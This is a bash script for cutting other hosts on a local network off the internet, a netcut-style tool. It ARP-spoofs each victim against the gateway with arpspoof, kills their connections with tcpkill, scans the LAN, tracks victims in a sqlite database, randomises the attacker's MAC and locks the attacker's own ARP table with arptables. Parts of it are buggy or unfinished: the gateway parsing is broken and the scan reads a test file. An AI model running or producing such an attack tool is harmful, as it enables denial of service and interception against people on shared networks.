#!/usr/bin/env bash

# A better class of script...
set -o errexit          # Exit on most errors (see the manual)
set -o errtrace         # Make sure any error trap is inherited
set -o nounset          # Disallow expansion of unset variables
set -o pipefail         # Use last non-zero exit code in a pipeline

# DESC: Handler for unexpected errors
# ARGS: $1 (optional): Exit code (defaults to 1)
# OUTS: None
function script_trap_err() {
    local exit_code=1

    # Disable the error trap handler to prevent potential recursion
    trap - ERR

    # Consider any further errors non-fatal to ensure we run to completion
    set +o errexit
    set +o pipefail

    # Validate any provided exit code
    if [[ ${1-} =~ ^[0-9]+$ ]]; then
        exit_code="$1"
    fi

    # Output debug data if in Cron mode
    if [[ -n ${cron-} ]]; then
        # Restore original file output descriptors
        if [[ -n ${script_output-} ]]; then
            exec 1>&3 2>&4
        fi

        # Print basic debugging information
        printf '%b\n' "$ta_none"
        printf '***** Abnormal termination of script *****\n'
        printf 'Script Path:            %s\n' "$script_path"
        printf 'Script Parameters:      %s\n' "$script_params"
        printf 'Script Exit Code:       %s\n' "$exit_code"

        # Print the script log if we have it. It's possible we may not if we
        # failed before we even called cron_init(). This can happen if bad
        # parameters were passed to the script so we bailed out very early.
        if [[ -n ${script_output-} ]]; then
            printf 'Script Output:\n\n%s' "$(cat "$script_output")"
        else
            printf 'Script Output:          None (failed before log init)\n'
        fi
    fi

    # Exit with failure status
    exit "$exit_code"
}


# DESC: Handler for exiting the script
# ARGS: None
# OUTS: None
function script_trap_exit() {
    cd "$orig_cwd"

    # Remove Cron mode script log
    if [[ -n ${cron-} && -f ${script_output-} ]]; then
        rm "$script_output"
    fi

    # Remove script execution lock
    if [[ -d ${script_lock-} ]]; then
        rmdir "$script_lock"
    fi

    # Restore terminal colours
    printf '%b' "$ta_none"
}


# DESC: Exit script with the given message
# ARGS: $1 (required): Message to print on exit
#       $2 (optional): Exit code (defaults to 0)
# OUTS: None
function script_exit() {
    if [[ $# -eq 1 ]]; then
		verbose_print "$1" ${fg_red-}
        # printf '%s\n' "$1"
        exit 0
    fi

    if [[ ${2-} =~ ^[0-9]+$ ]]; then
		verbose_print "$1" ${fg_red-}
        # printf '%b\n' "$1"
        # If we've been provided a non-zero exit code run the error trap
        if [[ $2 -ne 0 ]]; then
            script_trap_err "$2"
        else
            exit 0
        fi
    fi

    script_exit 'Missing required argument to script_exit()!' 2
}


# DESC: Generic script initialisation
# ARGS: $@ (optional): Arguments provided to the script
# OUTS: $orig_cwd: The current working directory when the script was run
#       $script_path: The full path to the script
#       $script_dir: The directory path of the script
#       $script_name: The file name of the script
#       $script_params: The original parameters provided to the script
#       $ta_none: The ANSI control code to reset all text attributes
# NOTE: $script_path only contains the path that was used to call the script
#       and will not resolve any symlinks which may be present in the path.
#       You can use a tool like realpath to obtain the "true" path. The same
#       caveat applies to both the $script_dir and $script_name variables.
function script_init() {
    # Useful paths
    readonly orig_cwd="$PWD"
    readonly script_path="${BASH_SOURCE[0]}"
    readonly script_dir="$(dirname "$script_path")"
    readonly script_name="$(basename "$script_path")"
    readonly script_params="$*"

    # Important to always set as we use it in the exit handler
    readonly ta_none="$(tput sgr0 2> /dev/null || true)"
	
	readonly dbname="$script_dir/status.db"
}


# DESC: Initialise colour variables
# ARGS: None
# OUTS: Read-only variables with ANSI control codes
# NOTE: If --no-colour was set the variables will be empty
function colour_init() {
    if ${no_colour-} ; then
        # Text attributes
        readonly ta_bold="$(tput bold 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly ta_uscore="$(tput smul 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly ta_blink="$(tput blink 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly ta_reverse="$(tput rev 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly ta_conceal="$(tput invis 2> /dev/null || true)"
        printf '%b' "$ta_none"

        # Foreground codes
        readonly fg_black="$(tput setaf 0 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly fg_blue="$(tput setaf 4 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly fg_cyan="$(tput setaf 6 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly fg_green="$(tput setaf 2 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly fg_magenta="$(tput setaf 5 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly fg_red="$(tput setaf 1 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly fg_white="$(tput setaf 7 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly fg_yellow="$(tput setaf 3 2> /dev/null || true)"
        printf '%b' "$ta_none"

        # Background codes
        readonly bg_black="$(tput setab 0 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly bg_blue="$(tput setab 4 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly bg_cyan="$(tput setab 6 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly bg_green="$(tput setab 2 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly bg_magenta="$(tput setab 5 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly bg_red="$(tput setab 1 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly bg_white="$(tput setab 7 2> /dev/null || true)"
        printf '%b' "$ta_none"
        readonly bg_yellow="$(tput setab 3 2> /dev/null || true)"
        printf '%b' "$ta_none"
    else
        # Text attributes
        readonly ta_bold=''
        readonly ta_uscore=''
        readonly ta_blink=''
        readonly ta_reverse=''
        readonly ta_conceal=''

        # Foreground codes
        readonly fg_black=''
        readonly fg_blue=''
        readonly fg_cyan=''
        readonly fg_green=''
        readonly fg_magenta=''
        readonly fg_red=''
        readonly fg_white=''
        readonly fg_yellow=''

        # Background codes
        readonly bg_black=''
        readonly bg_blue=''
        readonly bg_cyan=''
        readonly bg_green=''
        readonly bg_magenta=''
        readonly bg_red=''
        readonly bg_white=''
        readonly bg_yellow=''
    fi
}


# DESC: Initialise Cron mode
# ARGS: None
# OUTS: $script_output: Path to the file stdout & stderr was redirected to
function cron_init() {
    if [[ -n ${cron-} ]]; then
        # Redirect all output to a temporary file
        readonly script_output="$(mktemp --tmpdir "$script_name".XXXXX)"
        #exec 3>&1 4>&2 1>"$script_output" 2>&1
    fi
}


# DESC: Acquire script lock
# ARGS: $1 (optional): Scope of script execution lock (system or user)
# OUTS: $script_lock: Path to the directory indicating we have the script lock
# NOTE: This lock implementation is extremely simple but should be reliable
#       across all platforms. It does *not* support locking a script with
#       symlinks or multiple hardlinks as there's no portable way of doing so.
#       If the lock was acquired it's automatically released on script exit.
function lock_init() {
    local lock_dir
    if [[ $1 = 'system' ]]; then
        lock_dir="/tmp/$script_name.lock"
    elif [[ $1 = 'user' ]]; then
        lock_dir="/tmp/$script_name.$UID.lock"
    else
        script_exit 'Missing or invalid argument to lock_init()!' 2
    fi

    if mkdir "$lock_dir" 2> /dev/null; then
        readonly script_lock="$lock_dir"
        verbose_print "Acquired script lock: $script_lock"
    else
        script_exit "Unable to acquire script lock: $lock_dir" 2
    fi
}


# DESC: Pretty print the provided string
# ARGS: $1 (required): Message to print (defaults to a green foreground)
#       $2 (optional): Colour to print the message with. This can be an ANSI
#                      escape code or one of the prepopulated colour variables.
#       $3 (optional): Set to any value to not append a new line to the message
# OUTS: None
function pretty_print() {
    if [[ $# -lt 1 ]]; then
        script_exit 'Missing required argument to pretty_print()!' 2
    fi

    if ${no_colour-} ; then
        if [[ -n ${2-} ]]; then
            printf '%b' "$2"
        else
            printf '%b' "${fg_green-}"
        fi
    fi

    # Print message & reset text attributes
    if [[ -n ${3-} ]]; then
        printf '%s%b' "$1" "$ta_none"
    else
        printf '%s%b\n' "$1" "$ta_none"
    fi
}


# DESC: Only pretty_print() the provided string if verbose mode is enabled
# ARGS: $@ (required): Passed through to pretty_pretty() function
# OUTS: None
function verbose_print() {
    if ${verbose-}; then
		echo 
        pretty_print "$@"
    fi
}


# DESC: Combines two path variables and removes any duplicates
# ARGS: $1 (required): Path(s) to join with the second argument
#       $2 (optional): Path(s) to join with the first argument
# OUTS: $build_path: The constructed path
# NOTE: Heavily inspired by: https://unix.stackexchange.com/a/40973
function build_path() {
    if [[ $# -lt 1 ]]; then
        script_exit 'Missing required argument to build_path()!' 2
    fi

    local new_path path_entry temp_path

    temp_path="$1:"
    if [[ -n ${2-} ]]; then
        temp_path="$temp_path$2:"
    fi

    new_path=
    while [[ -n $temp_path ]]; do
        path_entry="${temp_path%%:*}"
        case "$new_path:" in
            *:"$path_entry":*) ;;
                            *) new_path="$new_path:$path_entry"
                               ;;
        esac
        temp_path="${temp_path#*:}"
    done

    # shellcheck disable=SC2034
    build_path="${new_path#:}"
}


# DESC: Check a binary exists in the search path
# ARGS: $1 (required): Name of the binary to test for existence
#       $2 (optional): Set to any value to treat failure as a fatal error
# OUTS: None
function check_binary() {
    if [[ $# -lt 1 ]]; then
        script_exit 'Missing required argument to check_binary()!' 2
    fi

    if ! command -v "$1" > /dev/null 2>&1; then
        if [[ -n ${2-} ]]; then
            script_exit "Missing dependency: Couldn't locate $1." 1
        else
            verbose_print "Missing dependency: $1" "${fg_red-}"
            return 1
        fi
    fi

    verbose_print "Found dependency: $1"
    return 0
}


# DESC: Validate we have superuser access as root (via sudo if requested)
# ARGS: $1 (optional): Set to any value to not attempt root access via sudo
# OUTS: None
function check_superuser() {
    local superuser test_euid
    if [[ $EUID -eq 0 ]]; then
        superuser=true
    elif [[ -z ${1-} ]]; then
        if check_binary sudo; then
            pretty_print 'Sudo: Updating cached credentials ...'
            if ! sudo -v; then
                verbose_print "Sudo: Couldn't acquire credentials ..." \
                              "${fg_red-}"
            else
                test_euid="$(sudo -H -- "$BASH" -c 'printf "%s" "$EUID"')"
                if [[ $test_euid -eq 0 ]]; then
                    superuser=true
                fi
            fi
        fi
    fi

    if [[ -z ${superuser-} ]]; then
        verbose_print 'Unable to acquire superuser credentials.' "${fg_red-}"
        return 1
    fi

    verbose_print 'Successfully acquired superuser credentials.'
    return 0
}


# DESC: Run the requested command as root (via sudo if requested)
# ARGS: $1 (optional): Set to zero to not attempt execution via sudo
#       $@ (required): Passed through for execution as root user
# OUTS: None
function run_as_root() {
    if [[ $# -eq 0 ]]; then
        script_exit 'Missing required argument to run_as_root()!' 2
    fi

    local try_sudo
    if [[ ${1-} =~ ^0$ ]]; then
        try_sudo=true
        shift
    fi

    if [[ $EUID -eq 0 ]]; then
        "$@"
    elif [[ -z ${try_sudo-} ]]; then
        sudo -H -- "$@"
    else
        script_exit "Unable to run requested command as root: $*" 1
    fi
}


# DESC: Usage help
# ARGS: None
# OUTS: None
function script_usage() {
    cat << EOF
${script_name-} [-h] [-v] [-c Victim IP or Row ID] [-r Victim IP or Row ID] [-a] [-s] [-f] [-x] [--cron] [--no-colour]
Usage:
     -h             Displays this help
     -v             Displays verbose output
     -c             Cut of internet of victim IP or rowid
     -r             Resume internet of single host ip or rowid
     -a             Resume internet of all host
     -s             Scan network for available IPs
     -f             Flush everthing and start from scratch
     -x             Debug script
	 --cron         Run script via cron job
	 --no-colour    Disable colour coding of verbose messages.
EOF
}


# DESC: Parameter parser
# ARGS: $@ (optional): Arguments provided to the script
# OUTS: Variables indicating command-line parameters and options
function parse_params() {
    verbose=false
	resume_single=false
	resume_all=false
	victim=
	cut_off=false
	resume_all=false
	scanonly=false
	flush=false
	no_colour=true
    while getopts ":hxvasfc:r:-:" param; do
        case $param in
            h)
                script_usage
                exit 0
                ;;
            v)
                verbose=true
                ;;
			c)
				cut_off=true
				victim=$OPTARG
				;;
			r)
				resume_single=true
				victim=$OPTARG
				;;
			a)
				resume_all=true
				;;
			s)
				scanonly=true
				;;
			f)
				flush=true
				;;
			x) 
				set -o xtrace          # Trace the execution of the script (debug)
				;;
			-)  
				LONG_OPTARG="${OPTARG#*=}"
				case $LONG_OPTARG in
					no-colour)
						no_colour=false
						;;
					cron)
						cron=true
						;;
				esac
				;;
            *)
                script_exit "Invalid parameter was provided: $param" 2
                ;;
        esac
    done
	shift $((OPTIND -1))
}


function enable_protection(){
	local gw=$1
	local mac=$2
	arptables -F
	arptables -P INPUT DROP
    arptables -P OUTPUT DROP
    arptables -A INPUT -s $gw --source-mac $mac -j ACCEPT
    arptables -A OUTPUT -d $gw --destination-mac $mac -j ACCEPT
}

function disable_protection(){
	arptables -P INPUT ACCEPT
    arptables -P OUTPUT ACCEPT
    arptables -F
}

function netcutvictim() {
	local gw=$1
	local victim=$2
    run_as_root sysctl -w net.ipv4.ip_forward=0 &>/dev/null
    run_as_root arpspoof -t $gw $victim &>/dev/null &
	local arpspoof_pid=$!
    run_as_root tcpkill -i ${iface-} -3 net $victim &>/dev/null &
	local tcpkill_pid=$!
	update_pid_machine_list $arpspoof_pid $tcpkill_pid $victim 1
}

function netresume_single_host() {
	local victim="$1"
	local machine_data=$(select_machine true $victim )
	verbose_print "$machine_data" $fg_green
	local a=(`echo $machine_data | sed 's/|/\n/g'`)
	run_as_root kill -n 9 ${a[5]} #arpspoof_pid
	run_as_root kill -n 9 ${a[6]} #tcpkill_pid
	update_pid_machine_list null null $victim 0
}

function netresumeall() {
	run_as_root sysctl -w net.ipv4.ip_forward=1
	run_as_root killall arpspoof
	run_as_root killall tcpkill
	update_all_machine_list 0
}

function change_mac() {
	local hexchars="0123456789ABCDEF"
	local end=$( for i in {1..12} ; do echo -n ${hexchars:$(( $RANDOM % 16 )):1} ; done | sed -e 's/\(..\)/-\1/g' ) 
	end=${end#*-}
	verbose_print "New MAC will be $end" ${fg_yellow-}
	ifconfig ${iface-} down hw ether $end
	ifconfig ${iface-} up
}

function default_gw(){
	while read -r line
	do
		#'none default via 30.147.0.1 dev wifi0 proto unspec metric 0'
		if [[ $line = *"default"* ]]; then
			# local a=(`echo $line | sed 's/ /\n/g'`)
            local a=${line// /\n/g}
			gw=${a[3]}
			iface=${a[5]}
            mymac=$(cat /sys/class/net/"${iface-}"/address)
            myip=$(hostname -I)
		fi
	done < <(ip route list)
	verbose_print "Gateway IP : $gw" ${fg_yellow-}
	verbose_print "Interface : $iface" ${fg_yellow-}
	verbose_print "Self IP : ${myip}" ${fg_yellow-}
    verbose_print "Self MAC : ${mymac-}" ${fg_yellow-}
}

function arpscan(){
	while read -r line
	do
		if [[ $line =~ ^([0-9]{1,3}.?){4}.+$ ]]; then
			local a=(`echo $line | sed 's/ /\n/g'`)
			insert_into_machine_list "${a[0]}" "${a[1]}"
			verbose_print "inserting machine ${a[0]} with mac ${a[1]}"
		fi
	done < testscan.txt
	# done < <(run_as_root arp-scan -l)
}

function insert_into_machine_list(){
	local qry="insert into machine_list(ip_address, mac_address, gw_address, iface, active) select '$1','$2','${gw-}','${iface-}',0 where not exists(select 1 from machine_list where ip_address = '${a[0]}');" 
	verbose_print "$qry" $fg_green
	sqlite3 "${dbname-}" "$qry"
}

function update_pid_machine_list(){
	local qry="update machine_list set arpspoof_pid=$1, tcpkill_pid=$2, active=$4 where ip_address='$3' or rowid='$3';"
	verbose_print "$qry" $fg_green
	sqlite3 "${dbname-}" "$qry"
}

function update_all_machine_list(){
	local qry="update machine_list set arpspoof_pid=null, tcpkill_pid=null, active=$1"
	verbose_print "$qry" $fg_green
	sqlite3 "${dbname-}" "$qry"
}

function refresh(){
	qry="delete from machine_list;"
	verbose_print "$qry" $fg_green
	sqlite3 "${dbname-}" "$qry"
}

function select_machine(){
	local noheader=${1:-}
	local ip=${2:-}
	local where=";"
	if [ -n "$ip" ]; then
		where=" where ip_address = '$ip' or rowid =  '$ip';"
	fi
	local qry="select rowid, ltrim(ip_address||'          ',20) as ip_address, gw_address, iface, arpspoof_pid, tcpkill_pid, active from machine_list"$where
	verbose_print "$qry" $fg_green
	if $noheader; then
		sqlite3 "${dbname-}" "$qry"
	else
		sqlite3 -column -header "${dbname-}" "$qry"
	fi
}

# DESC: Main control flow
# ARGS: $@ (optional): Arguments provided to the script
# OUTS: None
function main() {
    trap script_trap_err ERR
    trap script_trap_exit EXIT

    script_init "$@"
    parse_params "$@"
    cron_init
    colour_init
    lock_init system
	#change_mac
	default_gw
	if $flush; then
		netresumeall
		refresh
		arpscan
	elif $scanonly; then 
		arpscan
	elif $cut_off; then 
		enable_protection
		netcutvictim ${gw-} ${victim-}
	elif $resume_single; then 
		netresume_single_host ${victim-}
	elif $resume_all; then
		netresumeall
		disable_protection
	fi
	select_machine false
}

# Make it rain
main "$@"
